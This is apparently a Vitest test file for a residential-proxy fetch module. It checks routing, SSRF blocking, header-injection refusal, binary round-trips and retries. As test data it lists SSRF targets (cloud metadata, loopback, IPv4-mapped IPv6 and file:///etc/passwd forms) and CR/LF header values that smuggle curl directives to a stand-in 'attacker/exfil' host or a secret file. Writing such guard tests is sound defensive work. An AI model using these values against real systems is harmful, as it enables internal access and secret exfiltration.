import { afterEach, describe, expect, it, vi } from "vitest";
import { backoffDelay, drainRouteTally, fetchPageViaTailscale, fetchViaTailscale, hasUnsafeHeader, hmacHex, isBlockedTarget, isDirectHost, isPrivateIp, isTailscaleConfigured, isTextualContentType, smartFetch, willProxy } from "./proxy";

const ON = { TAILSCALE_PROXY_URL: "https://x.ts.net", TAILSCALE_PROXY_SECRET: "s" };

/** A fetch stub for the proxy endpoint: returns `payload` as the proxy's JSON envelope. */
const proxyEnvelope = (payload: Record<string, unknown>) =>
	new Response(JSON.stringify({ status: 200, statusText: "OK", headers: {}, bytes: 0, truncated: false, ...payload }), {
		status: 200,
		headers: { "content-type": "application/json" },
	});

afterEach(() => {
	vi.unstubAllGlobals();
	drainRouteTally(); // don't leak route counts between tests
});

describe("smart routing", () => {
	it("classifies infra/API hosts as direct hosts", () => {
		expect(isDirectHost("https://mcp.kagi.com/mcp")).toBe(true);
		expect(isDirectHost("https://ipwho.is/8.8.8.8")).toBe(true);
		expect(isDirectHost("https://www.homedepot.com/p/123")).toBe(false);
		// rdap.org/crt.sh are NOT direct — they 403/502 datacenter IPs, so they route residential.
		expect(isDirectHost("https://rdap.org/domain/x.com")).toBe(false);
		expect(isDirectHost("https://crt.sh/?q=x")).toBe(false);
		expect(isDirectHost("not a url")).toBe(false);
	});

	it("auto-routes web pages through the proxy but direct hosts direct", () => {
		expect(willProxy(ON, "https://example.com")).toBe(true);
		expect(willProxy(ON, "https://mcp.kagi.com/mcp")).toBe(false); // Kagi: authed API, no residential benefit
	});

	it("never proxies when the proxy is off", () => {
		expect(willProxy({}, "https://example.com")).toBe(false);
		expect(willProxy({ ...ON, TAILSCALE_PROXY_ALL: "0" }, "https://example.com")).toBe(false);
	});

	it("honors forced routes", () => {
		expect(willProxy(ON, "https://mcp.kagi.com", "proxy")).toBe(true); // force proxy overrides direct-host
		expect(willProxy(ON, "https://example.com", "direct")).toBe(false); // force direct overrides auto
	});
});

describe("SSRF guard", () => {
	it("blocks private, loopback, link-local, CGNAT, ULA and metadata targets", () => {
		expect(isBlockedTarget("http://127.0.0.1/")).toBe(true);
		expect(isBlockedTarget("http://10.0.0.5/")).toBe(true);
		expect(isBlockedTarget("http://172.16.0.1/")).toBe(true);
		expect(isBlockedTarget("http://172.31.255.255/")).toBe(true);
		expect(isBlockedTarget("http://192.168.1.1/")).toBe(true); // router admin UI
		expect(isBlockedTarget("http://169.254.169.254/latest/meta-data/")).toBe(true); // cloud metadata
		expect(isBlockedTarget("http://100.100.100.100/")).toBe(true); // Tailscale CGNAT
		expect(isBlockedTarget("http://0.0.0.0/")).toBe(true);
		expect(isBlockedTarget("http://localhost/")).toBe(true);
		expect(isBlockedTarget("http://api.localhost/")).toBe(true);
		expect(isBlockedTarget("http://[::1]/")).toBe(true);
		// `::` is the IPv6 twin of 0.0.0.0 — connect() reaches loopback on Linux, so block it too.
		expect(new URL("http://[::]/").hostname).toBe("[::]");
		expect(isBlockedTarget("http://[::]/")).toBe(true);
		expect(isBlockedTarget("http://[0:0:0:0:0:0:0:0]/")).toBe(true); // expanded form normalizes to [::]
		expect(isPrivateIp("::")).toBe(true);
		expect(isBlockedTarget("http://[fd12:3456::1]/")).toBe(true);
		expect(isBlockedTarget("http://[fe80::1]/")).toBe(true);
		expect(isBlockedTarget("gopher://example.com/")).toBe(true); // non-http(s) scheme
		expect(isBlockedTarget("file:///etc/passwd")).toBe(true);
		expect(isBlockedTarget("not a url")).toBe(true);
	});

	it("blocks the root-anchored FQDN form of localhost (trailing dot resolves to loopback)", () => {
		// `new URL` keeps the trailing dot in the hostname ("localhost."), which
		// resolves to loopback but slips past a naive === "localhost" / .endsWith
		// (".localhost") check — the guard must normalize the trailing dot away.
		expect(new URL("http://localhost./").hostname).toBe("localhost.");
		expect(isBlockedTarget("http://localhost./")).toBe(true);
		expect(isBlockedTarget("http://LOCALHOST./")).toBe(true);
		expect(isBlockedTarget("http://api.localhost./")).toBe(true); // .localhost subdomain, FQDN form
		expect(isBlockedTarget("http://localhost../")).toBe(true); // multiple trailing dots too
		// A public host with a trailing dot is still allowed (no over-block).
		expect(isBlockedTarget("http://example.com./")).toBe(false);
	});

	it("allows ordinary public hosts (incl. public IP literals and 172.x outside 16-31)", () => {
		expect(isBlockedTarget("https://example.com/")).toBe(false);
		expect(isBlockedTarget("https://www.homedepot.com/p/1")).toBe(false);
		expect(isBlockedTarget("https://8.8.8.8/")).toBe(false);
		expect(isBlockedTarget("https://172.32.0.1/")).toBe(false);
		expect(isBlockedTarget("https://[2606:4700::1]/")).toBe(false);
	});

	it("blocks IPv4-mapped IPv6 private/loopback/metadata literals (URL parser emits the hex tail)", () => {
		// `new URL` rewrites ::ffff:127.0.0.1 -> ::ffff:7f00:1, so the guard must
		// decode the hex tail back to IPv4; otherwise a mapped loopback slips through.
		expect(new URL("http://[::ffff:127.0.0.1]/").hostname).toBe("[::ffff:7f00:1]");
		expect(isBlockedTarget("http://[::ffff:127.0.0.1]/")).toBe(true); // loopback
		expect(isBlockedTarget("http://[::ffff:192.168.0.1]/")).toBe(true); // private LAN
		expect(isBlockedTarget("http://[::ffff:10.0.0.1]/")).toBe(true); // private
		expect(isBlockedTarget("http://[::ffff:169.254.169.254]/")).toBe(true); // cloud metadata
		expect(isBlockedTarget("http://[::ffff:100.64.0.1]/")).toBe(true); // CGNAT
		// A mapped PUBLIC address still decodes to public and is allowed (no over-block).
		expect(isBlockedTarget("http://[::ffff:8.8.8.8]/")).toBe(false);
		// isPrivateIp handles both the dotted and hex mapped forms directly.
		expect(isPrivateIp("::ffff:7f00:1")).toBe(true);
		expect(isPrivateIp("::ffff:127.0.0.1")).toBe(true);
		expect(isPrivateIp("::ffff:808:808")).toBe(false); // 8.8.8.8
	});

	it("smartFetch refuses a private target and never calls fetch", async () => {
		const fetchMock = vi.fn(async () => new Response("ok"));
		vi.stubGlobal("fetch", fetchMock);
		await expect(smartFetch(ON, "http://169.254.169.254/latest/meta-data/")).rejects.toThrow(/blocked target/i);
		await expect(smartFetch(ON, "http://192.168.1.1/", {}, "direct")).rejects.toThrow(/blocked target/i);
		expect(fetchMock).not.toHaveBeenCalled();
	});
});

describe("header-injection guard", () => {
	it("flags CR/LF in a header name or value, passes clean headers", () => {
		expect(hasUnsafeHeader(undefined)).toBe(false);
		expect(hasUnsafeHeader({ "x-a": "b" })).toBe(false);
		expect(hasUnsafeHeader(new Headers({ "x-ok": "fine" }))).toBe(false);
		// Embedded newline in a value → curl --config directive injection on the node.
		expect(hasUnsafeHeader({ "x-a": 'v\noutput = "/etc/sux-proxy.secret"' })).toBe(true);
		expect(hasUnsafeHeader({ "x-a": "v\r\nurl = http://attacker/exfil" })).toBe(true);
		// CR/LF in the key too.
		expect(hasUnsafeHeader({ "x-a\nurl": "http://attacker/exfil" })).toBe(true);
	});

	it("smartFetch refuses a CR/LF header and never calls fetch", async () => {
		const fetchMock = vi.fn(async () => new Response("ok"));
		vi.stubGlobal("fetch", fetchMock);
		await expect(
			smartFetch(ON, "https://example.com/", { headers: { "x-evil": 'v\noutput = "/etc/sux-proxy.secret"' } }),
		).rejects.toThrow(/header injection|CR\/LF/i);
		// Hard refusal: the malicious header reaches neither the proxy nor a direct fallback.
		expect(fetchMock).not.toHaveBeenCalled();
	});

	it("fetchViaTailscale refuses a CR/LF header before signing/sending", async () => {
		const fetchMock = vi.fn(async () => new Response("ok"));
		vi.stubGlobal("fetch", fetchMock);
		await expect(
			fetchViaTailscale(ON, "https://example.com/", { headers: { "x-evil": "v\nurl = http://attacker/exfil" } }),
		).rejects.toThrow(/header injection|CR\/LF/i);
		expect(fetchMock).not.toHaveBeenCalled();
	});
});

describe("isTailscaleConfigured", () => {
	it("is true only when both url and secret are set", () => {
		expect(isTailscaleConfigured({})).toBe(false);
		expect(isTailscaleConfigured({ TAILSCALE_PROXY_URL: "https://x.ts.net" })).toBe(false);
		expect(isTailscaleConfigured({ TAILSCALE_PROXY_SECRET: "s" })).toBe(false);
		expect(isTailscaleConfigured({ TAILSCALE_PROXY_URL: "https://x.ts.net", TAILSCALE_PROXY_SECRET: "s" })).toBe(true);
	});
});

describe("fetchViaTailscale", () => {
	it("throws when the proxy is not configured", async () => {
		await expect(fetchViaTailscale({}, "https://example.com")).rejects.toThrow(/not configured/);
	});
});

describe("binary safety through the proxied path", () => {
	// Every possible byte value — the payload that a JSON-string transport mangles.
	const allBytes = new Uint8Array(256).map((_, i) => i);
	const pngHeader = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
	const b64 = (bytes: Uint8Array) => btoa(String.fromCharCode(...bytes));

	it("round-trips bytes 0x00-0xFF byte-for-byte when the proxy base64-encodes the body", async () => {
		const fetchMock = vi.fn(async (_url: string | URL, _init?: { body?: string }) =>
			proxyEnvelope({ headers: { "content-type": "application/octet-stream" }, bytes: allBytes.length, body: b64(allBytes), bodyEncoding: "base64" }),
		);
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch(ON, "https://example.com/blob.bin");
		expect(new Uint8Array(await resp.arrayBuffer())).toEqual(allBytes);
		// Served entirely by the proxy — no direct refetch needed.
		expect(fetchMock).toHaveBeenCalledTimes(1);
		expect(String(fetchMock.mock.calls[0]?.[0])).toMatch(/^https:\/\/x\.ts\.net\/fetch\?ts=\d+&sig=[a-f0-9]+$/);
		// The request advertises that this client accepts base64 bodies.
		expect(JSON.parse(String(fetchMock.mock.calls[0]?.[1]?.body)).acceptBodyEncoding).toBe("base64");
	});

	it("decodes a base64-encoded TEXT body (proxy now base64s everything, incl. text)", async () => {
		const text = "fl=abc\nip=2601:601:a484:1500::1\nloc=US\n";
		const fetchMock = vi.fn(async () =>
			proxyEnvelope({ headers: { "content-type": "text/plain" }, bytes: text.length, body: btoa(text), bodyEncoding: "base64" }),
		);
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch(ON, "https://cloudflare.com/cdn-cgi/trace");
		expect(await resp.text()).toBe(text);
		// Served by the proxy — no direct refetch (stays residential).
		expect(fetchMock).toHaveBeenCalledTimes(1);
	});

	it("fetchPageViaTailscale preserves a PNG header exactly", async () => {
		vi.stubGlobal(
			"fetch",
			vi.fn(async () => proxyEnvelope({ headers: { "content-type": "image/png" }, bytes: pngHeader.length, body: b64(pngHeader), bodyEncoding: "base64" })),
		);
		const resp = await fetchPageViaTailscale(ON, "https://example.com/logo.png");
		expect(new Uint8Array(await resp.arrayBuffer())).toEqual(pngHeader);
	});

	it("refetches direct when a legacy proxy returns a binary body as a lossy string", async () => {
		const fetchMock = vi.fn(async (u: string | URL) => {
			if (String(u).startsWith("https://x.ts.net/")) {
				// Legacy transport: the proxy node UTF-8-decoded the PNG → U+FFFD soup.
				return proxyEnvelope({ headers: { "content-type": "image/png" }, bytes: pngHeader.length, body: new TextDecoder().decode(pngHeader) });
			}
			return new Response(pngHeader, { status: 200, headers: { "content-type": "image/png" } });
		});
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch(ON, "https://example.com/logo.png");
		expect(new Uint8Array(await resp.arrayBuffer())).toEqual(pngHeader);
		expect(fetchMock).toHaveBeenCalledTimes(2);
		expect(String(fetchMock.mock.calls[1][0])).toBe("https://example.com/logo.png");
	});

	it("still serves textual bodies from the legacy string transport without a refetch", async () => {
		const fetchMock = vi.fn(async () => proxyEnvelope({ headers: { "content-type": "text/html; charset=utf-8" }, body: "<p>hé</p>" }));
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch(ON, "https://example.com/");
		expect(await resp.text()).toBe("<p>hé</p>");
		expect(fetchMock).toHaveBeenCalledTimes(1);
	});

	it("classifies content types for string-transport safety", () => {
		expect(isTextualContentType("text/html; charset=utf-8")).toBe(true);
		expect(isTextualContentType("application/json")).toBe(true);
		expect(isTextualContentType("application/rss+xml")).toBe(true);
		expect(isTextualContentType(null)).toBe(true); // no header → legacy behavior
		expect(isTextualContentType("image/png")).toBe(false);
		expect(isTextualContentType("application/pdf")).toBe(false);
		expect(isTextualContentType("application/octet-stream")).toBe(false);
	});
});

describe("smartFetch direct-path timeout", () => {
	it("passes an AbortSignal to the direct/fallback fetch (30s bound)", async () => {
		const fetchMock = vi.fn(async (_url: string | URL, _init?: RequestInit) => new Response("ok", { status: 200 }));
		vi.stubGlobal("fetch", fetchMock);
		await smartFetch({}, "https://example.com/", {}, "direct");
		const init = fetchMock.mock.calls[0]?.[1];
		expect(init?.signal).toBeInstanceOf(AbortSignal);
	});
});

describe("route tally", () => {
	const html = () => proxyEnvelope({ headers: { "content-type": "text/html" }, body: "<p>ok</p>" });

	it("tallies proxied fetches and drains to empty", async () => {
		vi.stubGlobal("fetch", vi.fn(async () => html()));
		await smartFetch(ON, "https://example.com/");
		await smartFetch(ON, "https://example.com/2");
		expect(drainRouteTally()).toEqual({ proxied: 2 });
		expect(drainRouteTally()).toEqual({}); // drained
	});

	it("tallies direct when the proxy is off, forced direct, or the host is direct", async () => {
		vi.stubGlobal("fetch", vi.fn(async () => new Response("ok")));
		await smartFetch({}, "https://example.com/"); // proxy off
		await smartFetch(ON, "https://example.com/", {}, "direct"); // forced
		await smartFetch(ON, "https://mcp.kagi.com/mcp"); // direct host
		expect(drainRouteTally()).toEqual({ direct: 3 });
	});

	it("forces residential egress for a direct host when route is 'proxy' (the Kagi opt-in)", async () => {
		// mcp.kagi.com is a direct-host (auto → direct, asserted above), but an
		// explicit "proxy" route OVERRIDES isDirectHost so the query originates from
		// the residential IP — the search/web_search `proxy: true` opt-in. Prove it
		// end-to-end: the fetch hits the residential /fetch endpoint, not Kagi direct.
		const fetchMock = vi.fn(async (_u: string | URL, _init?: RequestInit) => html());
		vi.stubGlobal("fetch", fetchMock);
		await smartFetch(ON, "https://mcp.kagi.com/mcp", { method: "POST" }, "proxy");
		expect(drainRouteTally()).toEqual({ proxied: 1 });
		expect(String(fetchMock.mock.calls[0]?.[0])).toMatch(/^https:\/\/x\.ts\.net\/fetch\?ts=\d+&sig=[a-f0-9]+$/);
	});

	it("tallies proxy_fallback when the proxy errors", async () => {
		vi.stubGlobal(
			"fetch",
			vi.fn(async (u: string | URL) => (String(u).startsWith("https://x.ts.net/") ? new Response("boom", { status: 502 }) : new Response("ok"))),
		);
		await smartFetch(ON, "https://example.com/");
		expect(drainRouteTally()).toEqual({ proxy_fallback: 1 });
	});

	it("tallies binary_refetch when a legacy proxy mangles a binary body", async () => {
		vi.stubGlobal(
			"fetch",
			vi.fn(async (u: string | URL) =>
				String(u).startsWith("https://x.ts.net/")
					? proxyEnvelope({ headers: { "content-type": "image/png" }, body: "�PNG" })
					: new Response("bytes", { status: 200 }),
			),
		);
		await smartFetch(ON, "https://example.com/logo.png");
		expect(drainRouteTally()).toEqual({ binary_refetch: 1 });
	});
});

describe("smartFetch transient retry (direct path)", () => {
	it("retries once on a 503, then returns the 200 (2 attempts)", async () => {
		let n = 0;
		const fetchMock = vi.fn(async (_u: string | URL, _init?: RequestInit) => {
			n++;
			return n === 1 ? new Response("busy", { status: 503 }) : new Response("ok", { status: 200 });
		});
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch({}, "https://example.com/", {}, "direct");
		expect(resp.status).toBe(200);
		expect(await resp.text()).toBe("ok");
		expect(fetchMock).toHaveBeenCalledTimes(2);
	});

	it("returns a persistent 503 after exactly 3 attempts (no infinite loop)", async () => {
		const fetchMock = vi.fn(async (_u: string | URL, _init?: RequestInit) => new Response("still busy", { status: 503 }));
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch({}, "https://example.com/", {}, "direct");
		expect(resp.status).toBe(503);
		expect(fetchMock).toHaveBeenCalledTimes(3); // 1 try + 2 backoff retries
	});

	it("retries a 429 rate-limit response, then returns the success", async () => {
		let n = 0;
		const fetchMock = vi.fn(async (_u: string | URL, _init?: RequestInit) => {
			n++;
			return n < 3 ? new Response("slow down", { status: 429, headers: { "retry-after": "0" } }) : new Response("ok", { status: 200 });
		});
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch({}, "https://example.com/", {}, "direct");
		expect(resp.status).toBe(200);
		expect(fetchMock).toHaveBeenCalledTimes(3);
	});

	it("does NOT retry a 404 — returns it immediately (1 attempt)", async () => {
		const fetchMock = vi.fn(async (_u: string | URL, _init?: RequestInit) => new Response("nope", { status: 404 }));
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch({}, "https://example.com/", {}, "direct");
		expect(resp.status).toBe(404);
		expect(fetchMock).toHaveBeenCalledTimes(1);
	});

	it("does NOT retry a plain 500 — returns it immediately (1 attempt)", async () => {
		const fetchMock = vi.fn(async (_u: string | URL, _init?: RequestInit) => new Response("oops", { status: 500 }));
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch({}, "https://example.com/", {}, "direct");
		expect(resp.status).toBe(500);
		expect(fetchMock).toHaveBeenCalledTimes(1);
	});

	it("retries a thrown network error, then returns the success (2 attempts)", async () => {
		let n = 0;
		const fetchMock = vi.fn(async (_u: string | URL, _init?: RequestInit) => {
			n++;
			if (n === 1) throw new Error("network down");
			return new Response("recovered", { status: 200 });
		});
		vi.stubGlobal("fetch", fetchMock);
		const resp = await smartFetch({}, "https://example.com/", {}, "direct");
		expect(resp.status).toBe(200);
		expect(await resp.text()).toBe("recovered");
		expect(fetchMock).toHaveBeenCalledTimes(2);
	});

	it("propagates a persistent thrown error after 3 attempts", async () => {
		const fetchMock = vi.fn(async (_u: string | URL, _init?: RequestInit) => {
			throw new Error("network down");
		});
		vi.stubGlobal("fetch", fetchMock);
		await expect(smartFetch({}, "https://example.com/", {}, "direct")).rejects.toThrow(/network down/);
		expect(fetchMock).toHaveBeenCalledTimes(3); // 1 try + 2 backoff retries
	});
});

describe("backoffDelay", () => {
	it("honors a sane Retry-After (seconds → ms, capped)", () => {
		expect(backoffDelay(0, "2")).toBe(2000);
		expect(backoffDelay(5, "1")).toBe(1000); // Retry-After wins over exponential
		expect(backoffDelay(0, "99999")).toBe(8000); // capped at MAX_DELAY_MS
	});
	it("falls back to exponential-with-jitter within [ceil/2, ceil] when no Retry-After", () => {
		for (let attempt = 0; attempt < 4; attempt++) {
			const ceil = Math.min(250 * 2 ** attempt, 8000);
			for (let i = 0; i < 50; i++) {
				const d = backoffDelay(attempt, null);
				expect(d).toBeGreaterThanOrEqual(Math.floor(ceil / 2));
				expect(d).toBeLessThanOrEqual(ceil);
			}
		}
	});
	it("ignores a garbage Retry-After and uses the backoff", () => {
		const d = backoffDelay(0, "soon");
		expect(d).toBeGreaterThanOrEqual(125);
		expect(d).toBeLessThanOrEqual(250);
	});
});

describe("hmacHex", () => {
	it("matches the known HMAC-SHA256 test vector", async () => {
		// RFC-style vector: key "key", msg "The quick brown fox jumps over the lazy dog"
		expect(await hmacHex("key", "The quick brown fox jumps over the lazy dog")).toBe(
			"f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8",
		);
	});
	it("is deterministic and secret-sensitive", async () => {
		expect(await hmacHex("s1", "m")).toBe(await hmacHex("s1", "m"));
		expect(await hmacHex("s1", "m")).not.toBe(await hmacHex("s2", "m"));
	});
});
